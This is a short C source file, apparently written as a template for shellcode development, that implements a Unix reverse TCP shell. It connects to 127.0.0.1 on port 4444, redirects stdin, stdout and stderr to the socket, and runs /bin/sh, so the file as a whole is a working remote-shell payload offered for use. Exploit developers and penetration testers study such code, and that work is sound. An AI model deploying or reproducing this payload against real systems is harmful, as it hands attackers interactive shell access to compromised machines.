/*
Unix reverse_tcp c code for shellcoding
Balazs Bucsay
@xoreipeip | earthquake <at@> rycon <do.t> hu
http://rycon.hu

no error handling. just for testing purposes
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

int main()
{
	int s, c;
	int temp;
	struct sockaddr_in sa;
	char *argv[] = {"/bin/sh", NULL};
	s = socket(PF_INET, SOCK_STREAM, 0);
	memset(&sa, 0, sizeof(struct sockaddr_in));
	
	sa.sin_family = AF_INET;
	sa.sin_port = htons(4444);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	connect(s, (struct sockaddr *)&sa, sizeof(sa));

	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	execve(argv[0], argv, NULL);
	return 0;
}
